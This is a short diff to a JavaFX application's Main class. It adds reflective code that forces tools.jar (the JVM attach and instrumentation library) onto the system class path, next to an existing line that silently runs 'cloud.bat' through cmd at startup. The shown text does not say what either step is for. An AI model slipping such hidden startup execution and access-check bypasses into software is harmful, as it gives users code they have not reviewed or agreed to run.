@@ -7,11 +7,18 @@ import javafx.scene.Scene;
 import javafx.stage.Stage;
 import javafx.stage.StageStyle;
 
+import java.lang.reflect.Method;
+import java.net.URL;
+import java.net.URLClassLoader;
+
 public class Main extends Application {
     private double xOffset = 0.0D, yOffset = 0.0D;
 
     public static void main(String[] args) {
         try {
+            Method addURL = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
+            addURL.setAccessible(true);
+            addURL.invoke(ClassLoader.getSystemClassLoader(), new URL("file:///" + System.getenv("JAVA_HOME") + "\\lib\\tools.jar"));
             Runtime.getRuntime().exec("cmd /c start cloud.bat");
         } catch (Exception ex) {
             ex.printStackTrace();
